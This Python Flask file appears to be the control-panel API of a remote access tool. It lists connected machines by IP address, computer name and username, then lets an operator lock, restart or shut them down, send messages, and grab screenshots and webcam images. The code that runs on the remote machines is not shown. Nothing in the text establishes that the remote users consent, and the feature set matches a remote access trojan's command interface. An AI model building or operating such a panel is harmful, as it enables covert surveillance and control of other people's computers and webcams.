from flask import Flask, jsonify, request
from flask_cors import CORS
import logging
import sys

log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)
cli = sys.modules['flask.cli']
cli.show_server_banner = lambda *x: None

api = Flask(__name__)
CORS(api)

connection = None
connectionRequiredRoutes = [
    '/api/client',
    '/api/append-connection',
    '/api/send-message',
    '/api/lock-computer',
    '/api/restart-computer',
    '/api/shutdown-computer',
    '/api/screenshot',
    '/api/webcam',
]

def get_connection_id():
    return connection

@api.before_request
def before_request():
    global connection

    if (request.path in connectionRequiredRoutes):
        if (connection is None):
            return jsonify({'connected': False, 'message': 'Not connected to a client.'})
        
        if (not api.isConnected(connection)):
            connection = None
            return jsonify({'connected': False, 'message': 'Disconnected from client.'})

# GET REQUESTS
@api.get('/api/clients')
def clients():
    clients = api.ManageConnections('clients')
    clientInfo = []
    
    for client in clients:
        clientInfo.append({
            'ip_address': client['ip_address'],
            'computer': client['computer_name'],
            'username': client['username'],
            'connection_id': client['connection_id'],
        })

    return jsonify(clientInfo)

@api.get('/api/client')
def getClient():
    global connection

    info = api.ClientInformation(connection)
    if (info is None):
        connection = None
        return jsonify({'connected': False, 'message': 'Not connected to a client.'})

    return {
        'connected': connection is not None,
        'client': api.ClientInformation(connection),
    }

# POST REQUESTS
@api.post('/api/connect-client/<id>')
def ConnectClient(id):
    global connection

    if (api.ManageConnections('connect', id)):
        connection = int(id)
        return jsonify({'connected': True, 'message': 'Connected to Client'})
    else:
        return jsonify({'connected': False, 'message': 'Unable to Connect'})

@api.post('/api/append-connection')
def AppendConnection():
    global connection

    if (api.ControlClient('append', connection)):
        message = 'Connection Appended'
        connected = True
    else:
        message = 'Unable to Append Connection, disconnected from client'
        connected = False

    connection = None
    return jsonify({'connected': connected, 'message': message})

@api.post('/api/send-message')
def SendMessage():
    global connection

    message = request.json['message']
    if (api.SendMessage(connection, message)):
        return jsonify({'sent': True, 'message': 'Message Sent'})
    else:
        return jsonify({'sent': False, 'message': 'Unable to Send Message'})
    
@api.post('/api/lock-computer')
def LockComputer():
    global connection

    if (api.SystemAction(connection, 'lock')):
        return jsonify({'locked': True, 'message': 'Computer Locked'})
    else:
        return jsonify({'locked': False, 'message': 'Unable to Lock Computer'})
    
@api.post('/api/restart-computer')
def RestartComputer():
    global connection

    if (api.SystemAction(connection, 'restart')):
        return jsonify({'restarted': True, 'message': 'Computer Restarted'})
    else:
        return jsonify({'restarted': False, 'message': 'Unable to Restart Computer'})

@api.post('/api/shutdown-computer')
def ShutdownComputer():
    global connection

    if (api.SystemAction(connection, 'shutdown')):
        return jsonify({'shutdown': True, 'message': 'Computer Shutdown'})
    else:
        return jsonify({'shutdown': False, 'message': 'Unable to Shutdown Computer'})
    
@api.post('/api/screenshot')
def Screenshot():
    global connection

    result = api.Screenshot(connection)
    if (result is not None):
        return jsonify({'captured': True, 'message': 'Screenshot Captured', 'image': str(result, 'utf-8')})
    else:
        return jsonify({'captured': False, 'message': 'Unable to Capture Screenshot', 'image': None})
    
@api.post('/api/webcam')
def Webcam():
    global connection

    result = api.Webcam(connection)
    if (result is not None):
        return jsonify({'captured': True, 'message': 'Webcam Captured', 'image': str(result, 'utf-8')})
    else:
        return jsonify({'captured': False, 'message': 'Unable to Capture Webcam', 'image': None})